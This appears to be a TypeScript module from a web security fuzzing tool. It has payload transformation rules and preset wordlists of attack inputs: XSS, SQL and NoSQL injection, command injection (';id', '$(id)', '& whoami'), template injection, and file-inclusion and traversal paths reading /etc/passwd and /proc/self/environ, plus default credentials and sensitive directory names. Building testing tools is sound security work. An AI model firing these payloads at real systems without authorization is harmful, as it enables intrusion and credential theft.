import { base64Encode, base64UrlEncode, hexEncode, htmlEncode, md5Hex, urlEncode, urlEncodeAll } from "./codec";

export type EncodeKind = "base64" | "base64url" | "url" | "url-all" | "hex" | "html" | "html-hex" | "unicode";

export type PayloadRule =
  | { id: string; type: "prefix"; value: string }
  | { id: string; type: "suffix"; value: string }
  | { id: string; type: "case"; value: "upper" | "lower" }
  | { id: string; type: "encode"; kind: EncodeKind }
  | { id: string; type: "hash"; algo: "md5" }
  | { id: string; type: "arith"; op: "add" | "sub"; amount: string }
  | { id: string; type: "substring"; start: string; length: string }
  | { id: string; type: "reverse" }
  | { id: string; type: "replace"; match: string; replace: string; regex: boolean }
  | { id: string; type: "skip"; match: string; regex: boolean };

export const ENCODE_LABELS: Record<EncodeKind, string> = {
  base64: "Base64",
  base64url: "Base64URL",
  url: "URL",
  "url-all": "URL (all)",
  hex: "Hex",
  html: "HTML",
  "html-hex": "HTML (hex)",
  unicode: "Unicode escape",
};

const ENCODERS: Record<EncodeKind, (v: string) => string> = {
  base64: base64Encode,
  base64url: base64UrlEncode,
  url: urlEncode,
  "url-all": urlEncodeAll,
  hex: hexEncode,
  html: htmlEncode,
  "html-hex": (v) => [...v].map((c) => "&#x" + c.charCodeAt(0).toString(16) + ";").join(""),
  unicode: (v) => [...v].map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join(""),
};

export function applyProcessors(payload: string, rules: PayloadRule[]): string | null {
  let value = payload;
  for (const rule of rules) {
    if (rule.type === "prefix") value = rule.value + value;
    else if (rule.type === "suffix") value = value + rule.value;
    else if (rule.type === "case") value = rule.value === "upper" ? value.toUpperCase() : value.toLowerCase();
    else if (rule.type === "encode") value = ENCODERS[rule.kind](value);
    else if (rule.type === "hash") value = md5Hex(value);
    else if (rule.type === "reverse") value = [...value].reverse().join("");
    else if (rule.type === "arith") {
      const base = Number(value);
      const amount = Number(rule.amount);
      if (Number.isFinite(base) && Number.isFinite(amount)) {
        value = String(rule.op === "sub" ? base - amount : base + amount);
      }
    } else if (rule.type === "substring") {
      const start = Math.max(0, Number(rule.start) || 0);
      const length = Number(rule.length);
      value = Number.isFinite(length) && length >= 0 ? value.substr(start, length) : value.slice(start);
    } else if (rule.type === "replace") {
      try {
        value = rule.regex ? value.replace(new RegExp(rule.match, "g"), rule.replace) : value.split(rule.match).join(rule.replace);
      } catch {

      }
    } else if (rule.type === "skip") {
      try {
        const hit = rule.regex ? new RegExp(rule.match).test(value) : value.includes(rule.match);
        if (hit) return null;
      } catch {

      }
    }
  }
  return value;
}

const RANGE_CAP = 20000;

export function numberRange(from: number, to: number, step: number): string {
  const out: string[] = [];
  const s = step === 0 ? 1 : Math.abs(step);
  if (from <= to) {
    for (let n = from; n <= to && out.length < RANGE_CAP; n += s) out.push(String(n));
  } else {
    for (let n = from; n >= to && out.length < RANGE_CAP; n -= s) out.push(String(n));
  }
  return out.join("\n");
}

export function nullPayloads(count: number): string {
  const n = Math.max(1, Math.min(RANGE_CAP, count));
  return new Array(n).fill("").join("\n");
}

export const PRESETS: { label: string; make: () => string }[] = [
  { label: "Numbers 0–100", make: () => numberRange(0, 100, 1) },
  { label: "Null payloads x50", make: () => nullPayloads(50) },
  {
    label: "XSS",
    make: () =>
      [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "'><svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "\"><img src=x onerror=alert(document.domain)>",
      ].join("\n"),
  },
  {
    label: "SQLi",
    make: () =>
      ["'", '"', "' OR '1'='1", "' OR 1=1-- -", "1' ORDER BY 1-- -", "' UNION SELECT NULL-- -", "1;WAITFOR DELAY '0:0:5'--", "') OR ('1'='1"].join("\n"),
  },
  {
    label: "Command injection",
    make: () =>
      [";id", "|id", "$(id)", "& whoami", "&& whoami", "|| whoami", "; sleep 5", "$(sleep 5)", "%0aid", "127.0.0.1;id"].join("\n"),
  },
  {
    label: "SSTI",
    make: () =>
      ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}", "@(7*7)", "{{config}}", "{{''.__class__}}"].join("\n"),
  },
  {
    label: "NoSQLi",
    make: () =>
      ['{"$gt":""}', '{"$ne":null}', '{"$ne":1}', "[$ne]=1", "'||'1'=='1", '{"$where":"1==1"}', '{"$regex":".*"}'].join("\n"),
  },
  {
    label: "LFI",
    make: () =>
      ["/etc/passwd", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ", "file:///etc/passwd", "expect://id"].join("\n"),
  },
  {
    label: "Common passwords",
    make: () =>
      ["password", "123456", "admin", "letmein", "welcome", "qwerty", "P@ssw0rd", "changeme", "root", "toor", "password1", "admin123"].join("\n"),
  },
  {
    label: "HTTP methods",
    make: () => ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT", "PROPFIND"].join("\n"),
  },
  {
    label: "Traversal",
    make: () => ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd", "/etc/passwd%00", "..\\..\\..\\windows\\win.ini"].join("\n"),
  },
  {
    label: "Dirs",
    make: () =>
      ["admin", "login", "api", "config", ".git", ".env", "backup", "test", "dashboard", "uploads", "wp-admin", "phpmyadmin", "robots.txt", ".well-known"].join("\n"),
  },
  {
    label: "Usernames",
    make: () => ["admin", "administrator", "root", "test", "user", "guest", "demo", "operator", "support", "info"].join("\n"),
  },
  {
    label: "Fuzz",
    make: () => ["'", '"', "`", "<", ">", "{{7*7}}", "${7*7}", "%00", "\\", "|id", ";id", "$(id)", "../", "%0d%0a"].join("\n"),
  },
  { label: "Booleans", make: () => ["true", "false", "1", "0", "null", "undefined", "yes", "no"].join("\n") },
];
